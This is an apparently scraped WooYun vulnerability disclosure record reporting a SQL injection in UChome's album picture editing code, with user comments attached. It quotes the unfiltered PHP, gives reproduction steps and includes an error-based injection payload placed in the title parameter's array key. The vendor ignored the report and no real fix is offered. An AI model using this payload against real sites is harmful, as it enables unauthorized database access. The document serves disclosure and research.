{"id": 5894, "wybug_id": "wooyun-2013-044061", "wybug_title": "UChome 注入漏洞", "wybug_corp": "Discuz!", "wybug_author": "Matt", "wybug_date": "2013-11-25 23:04", "wybug_open_date": "2014-02-20 23:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向公众公开  简要描述： UChome 注入漏洞 详细说明：  \nsource/cp_clbum.php} elseif($_GET['op'] == 'editpic') {\t\t$managealbum = checkperm('managealbum');\tinclude_once(S_ROOT.'./source/function_bbcode.php');\t\tif($albumid > 0) {\t\t$query = $_SGLOBAL['db']->query(\"SELECT * FROM \".tname('album').\" WHERE albumid='$albumid'\");\t\tif(!$album = $_SGLOBAL['db']->fetch_array($query)) {\t\t\tshowmessage('no_privilege');\t\t}\t\t\t\tif($album['uid'] != $_SGLOBAL['supe_uid'] && !$managealbum) {\t\t\tshowmessage('no_privilege');\t\t}\t}\t\tif(submitcheck('editpicsubmit')) {\t\tif($_GET['subop'] == 'delete') {\t\t\t//删除\t\t\t$updates = $deleteids = array();\t\t\tforeach ($_POST['title'] as $picid => $value) {\t\t\t\tif(empty($_POST['ids'][$picid])) {\t\t\t\t\t$title = getstr($value, 150, 1, 1, 1);\t\t\t\t\t\t\t\t\t\t$wherearr = array('picid'=>$picid);\t\t\t\t\tif(!$managealbum) $wherearr['uid']  = $_SGLOBAL['supe_uid'];//自己\t\t\t\t\t\t\t\t\t\tupdatetable('pic', array('title'=>$title), $wherearr);\t\t\t\t} else {\t\t\t\t\t$deleteids[$picid] = $picid;\t\t\t\t}\t\t\t}\t\t\tif($deleteids) {\t\t\t\tinclude_once(S_ROOT.'./source/function_delete.php');\t\t\t\tdeletepics($deleteids);\t\t\t}\t\t\t\t\t} elseif($_GET['subop'] == 'update') {\t\t\t\t\t\tforeach ($_POST['title'] as $picid => $value) {\t\t\t\t$title = getstr($value, 150, 1, 1, 1);//\t\t\t\t//echo 2222222;exit();\t\t\t\t$wherearr = array('picid'=>$picid);//这里可以看到KEY没有过滤~~\t\t\t\tif(!$managealbum) $wherearr['uid']  = $_SGLOBAL['supe_uid'];//自己\t\t\t\tupdatetable('pic', array('title'=>$title), $wherearr);\t\t\t}\n   漏洞证明：  利用方法首先注册用户然后新建一个相册http://127.0.0.1/uchome/space.php?uid=2&do=album&view=me 打开这里点上床新建完了之后 上传一个图片完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片直接确认 然后抓包把titie的那个改成title%5B1' and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#%5D原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了\n\n\n\n\n\n\n\n   修复方案：  你猜啊~~   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-02-20 23:04 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-25 23:25 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  会不会很鸡肋。    \n     2013-11-25 23:42 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @demonalex 哎 我也是手贱。。。    \n     2013-11-26 02:19 |    \t\tRa1nker \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | TeST)\t\t \n  mark    \n     2013-11-26 06:13 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  额·... UChome貌似很少人用了..    \n     2013-11-26 08:46 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @demonalex 那发哪里 另外再无故骂人请自己走吧    \n     2013-11-26 09:13 |    \t\tz@cx \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:56        | 。-。-。)\t\t \n  @BadCat 到处都是。。。    \n     2013-11-26 09:24 |    \t\t齐迹 \t\t\t( 核心白帽子 |\t\t\t        Rank:784 漏洞数:100        | 一名普通的phper开发者，关注web安全。)\t\t \n  坐等忽略！    \n     2013-11-26 10:05 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  UChome。。。。现在有人用么。？    \n     2013-11-26 13:28 |    \t\tNetSeif \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:13        | ‮（子帽白心核)\t\t \n  不明觉厉！    \n     2013-11-26 14:01 |    \t\t邪少 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:7        )\t\t \n  @demonalex 你好像不愿意。。很明显  你是做黑产的    \n     2013-11-26 15:31 |    \t\tdemonalex \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:4        | demonalex是傻逼，呵呵呵！)\t\t \n  @xsser 你是哪位？    \n     2013-11-26 15:31 |    \t\tdemonalex \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:4        | demonalex是傻逼，呵呵呵！)\t\t \n  @邪少 我是包工程的    \n     2013-11-26 15:32 |    \t\tdemonalex \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:4        | demonalex是傻逼，呵呵呵！)\t\t \n  @Matt 别再让我看到有下次    \n     2013-11-26 15:54 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @demonalex 不会了 已封    \n     2013-11-26 16:55 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @xsser 卧槽 这就封了     \n     2013-11-26 17:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Matt 这货号被盗了    \n     2013-11-26 18:21 |    \t\tMatt  \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:107        | 承接代码审计 http://codescan.cn/)\t\t \n  @xsser soga 我说呢    \n     2013-11-27 15:36 |    \t\tccp0101 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:2        | 无。)\t\t \n  对于 @xsser 的作风 无语言对 这件事看清这个人的作风 还以为wooyun老大有多大气呢 说了一句“@xsser 你是哪位？ ” 就封号 人家来评评理 所谓的wooyun就是你在这里都要听wooyun老大的话 不然就给你封号    \n     2013-11-27 15:54 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @ccp0101 http://zone.wooyun.org/content/8612 已经解释 骂人的话我已经删了 ：）    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}